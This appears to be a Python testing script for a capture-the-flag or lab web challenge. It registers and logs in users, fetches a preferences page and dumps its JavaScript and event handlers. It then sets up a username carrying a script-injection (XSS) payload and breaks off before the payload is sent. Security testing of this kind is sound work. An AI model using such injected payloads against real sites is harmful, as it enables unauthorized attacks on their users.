import requests
import re
from bs4 import BeautifulSoup

# Target URL
base_url = "http://challenge.local:8003"

def register_and_login(username, password="testpass123"):
    """Register a new user and login to get session"""
    session = requests.Session()
    
    # Step 1: Get registration page to extract CSRF token
    print(f"\n[*] Getting registration page for user: {username}")
    reg_page = session.get(f"{base_url}/accounts/register/")
    print(f"[+] Registration page status: {reg_page.status_code}")
    
    # Extract CSRF token
    csrf_match = re.search(r'name=["\']csrfmiddlewaretoken["\'] value=["\']([^"\']+)["\']', reg_page.text)
    if not csrf_match:
        print("[-] Could not find CSRF token in registration page")
        return None
    
    csrf_token = csrf_match.group(1)
    print(f"[+] CSRF token: {csrf_token[:20]}...")
    
    # Step 2: Register user
    print(f"\n[*] Registering user: {username}")
    reg_data = {
        'csrfmiddlewaretoken': csrf_token,
        'username': username,
        'password1': password,
        'password2': password
    }
    
    reg_response = session.post(
        f"{base_url}/accounts/register/",
        data=reg_data,
        headers={'Referer': f"{base_url}/accounts/register/"}
    )
    print(f"[+] Registration response status: {reg_response.status_code}")
    print(f"[+] Redirected to: {reg_response.url}")
    
    # Step 3: Get login page for fresh CSRF token
    print(f"\n[*] Getting login page")
    login_page = session.get(f"{base_url}/accounts/login/")
    csrf_match = re.search(r'name=["\']csrfmiddlewaretoken["\'] value=["\']([^"\']+)["\']', login_page.text)
    if csrf_match:
        csrf_token = csrf_match.group(1)
        print(f"[+] New CSRF token: {csrf_token[:20]}...")
    
    # Step 4: Login
    print(f"\n[*] Logging in as: {username}")
    login_data = {
        'csrfmiddlewaretoken': csrf_token,
        'username': username,
        'password': password
    }
    
    login_response = session.post(
        f"{base_url}/accounts/login/",
        data=login_data,
        headers={'Referer': f"{base_url}/accounts/login/"}
    )
    print(f"[+] Login response status: {login_response.status_code}")
    print(f"[+] Redirected to: {login_response.url}")
    print(f"[+] Session cookies: {session.cookies.get_dict()}")
    
    return session

def access_preferences(session, username):
    """Access preferences page with authenticated session"""
    print(f"\n[*] Accessing /accounts/preferences/ for user: {username}")
    
    prefs_response = session.get(f"{base_url}/accounts/preferences/")
    print(f"[+] Preferences page status: {prefs_response.status_code}")
    print(f"[+] Content-Type: {prefs_response.headers.get('Content-Type', 'N/A')}")
    print(f"[+] Response length: {len(prefs_response.text)} bytes")
    
    return prefs_response

def extract_javascript(html_content):
    """Extract all JavaScript from HTML"""
    soup = BeautifulSoup(html_content, 'html.parser')
    
    print("\n" + "="*80)
    print("JAVASCRIPT ANALYSIS")
    print("="*80)
    
    # Find all script tags
    scripts = soup.find_all('script')
    print(f"\n[*] Found {len(scripts)} <script> tags")
    
    for idx, script in enumerate(scripts, 1):
        print(f"\n--- Script #{idx} ---")
        if script.get('src'):
            print(f"External script: {script['src']}")
        else:
            script_content = script.string
            if script_content and script_content.strip():
                print("Inline script:")
                print(script_content)
            else:
                print("Empty script tag")
    
    # Find inline event handlers
    print("\n[*] Checking for inline event handlers...")
    for tag in soup.find_all(True):
        for attr in tag.attrs:
            if attr.startswith('on'):
                print(f"Found {attr}='{tag[attr]}' in <{tag.name}>")

def save_full_html(html_content, filename):
    """Save full HTML to file"""
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(html_content)
    print(f"\n[+] Full HTML saved to: {filename}")

# Test 1: Normal user
print("="*80)
print("TEST 1: NORMAL USER - 'normaluser'")
print("="*80)

session1 = register_and_login("normaluser", "testpass123")
if session1:
    prefs_response1 = access_preferences(session1, "normaluser")
    save_full_html(prefs_response1.text, "/tmp/preferences_normal.html")
    extract_javascript(prefs_response1.text)
    
    # Show full HTML
    print("\n" + "="*80)
    print("FULL HTML CONTENT - NORMAL USER")
    print("="*80)
    print(prefs_response1.text)

# Test 2: XSS payload username
print("\n\n")
print("="*80)
print("TEST 2: XSS PAYLOAD USERNAME")
print("="*80)

xss_username = "test<script>alert('XSS')</script>"
